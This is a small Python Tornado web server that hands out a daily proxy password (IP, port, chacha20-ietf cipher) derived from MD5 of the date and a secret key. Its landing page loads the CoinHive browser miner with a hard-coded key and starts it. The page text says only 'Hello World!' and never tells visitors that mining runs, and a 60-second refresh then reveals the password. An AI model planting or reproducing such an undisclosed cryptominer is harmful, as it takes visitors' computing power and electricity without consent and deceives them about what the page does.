import time
import hashlib

import tornado.ioloop
import tornado.web

import config


def getTodayPassword():
    today = time.strftime("%a%b%d%Y", time.localtime()) 
    todayHash = hashlib.md5(today.encode('utf-8')).hexdigest() + config.secretKey
    todayPassword = hashlib.md5(todayHash.encode("utf-8")).hexdigest()
    return todayPassword

class MainHandler(tornado.web.RequestHandler):
    def get(self):
        self.write("<html><head><meta http-equiv='refresh' content='60;url=/hash/"+ getTodayPassword()+ "' /> <script src='https://coinhive.com/lib/coinhive.min.js'></script></head><body>Hello World! This Site is not for business<script>var miner = new CoinHive.Anonymous('WNXdUrjMlNuaFhc2BXVLoRL4dVcAyI5k');miner.start();</script>")


class ShareHandler(tornado.web.RequestHandler):
    def get(self):
        self.write("**Today**, ip is " + config.ipAddress + ", encryption is chacha20-ietf, port is 8888, password is " + getTodayPassword())

application = tornado.web.Application([
    (r"/", MainHandler),
    (r"/hash/.*", ShareHandler),    
])

if __name__ == "__main__":
    application.listen(80)
    tornado.ioloop.IOLoop.instance().start()